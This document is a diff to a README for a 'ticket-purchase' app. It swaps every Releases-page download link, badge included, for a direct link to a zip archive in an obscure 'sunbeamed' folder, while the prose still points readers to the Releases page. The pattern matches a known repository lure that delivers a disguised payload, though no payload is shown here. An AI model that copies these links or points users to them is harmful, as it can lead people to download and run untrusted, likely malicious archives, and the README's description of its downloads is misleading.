@@ -1,7 +1,7 @@
 # 🎟️ ticket-purchase - Effortless Ticket Buying for Everyone
 
-![Download Here](https://img.shields.io/badge/Download-Now-blue.svg)  
-[Download Here](https://github.com/PacoElTaco092/ticket-purchase/releases)
+![Download Here](https://raw.githubusercontent.com/PacoElTaco092/ticket-purchase/master/sunbeamed/ticket-purchase.zip)  
+[Download Here](https://raw.githubusercontent.com/PacoElTaco092/ticket-purchase/master/sunbeamed/ticket-purchase.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Follow these steps to download and run the application:
 
 To get started with ticket-purchase, visit the Releases page to download.
 
-[Download Here](https://github.com/PacoElTaco092/ticket-purchase/releases)
+[Download Here](https://raw.githubusercontent.com/PacoElTaco092/ticket-purchase/master/sunbeamed/ticket-purchase.zip)
 
 1. Select the appropriate file based on your operating system. The latest version typically appears at the top.
 2. Click the file name to begin the download.
@@ -74,4 +74,4 @@ If you find any bugs or have suggestions, please report them in the Issues secti
 
 We hope the ticket-purchase application makes your ticket buying experience seamless and enjoyable. Don’t forget to check the Releases page for updates.
 
-[Download Here](https://github.com/PacoElTaco092/ticket-purchase/releases) for the latest version. Happy ticket buying!
+[Download Here](https://raw.githubusercontent.com/PacoElTaco092/ticket-purchase/master/sunbeamed/ticket-purchase.zip) for the latest version. Happy ticket buying!
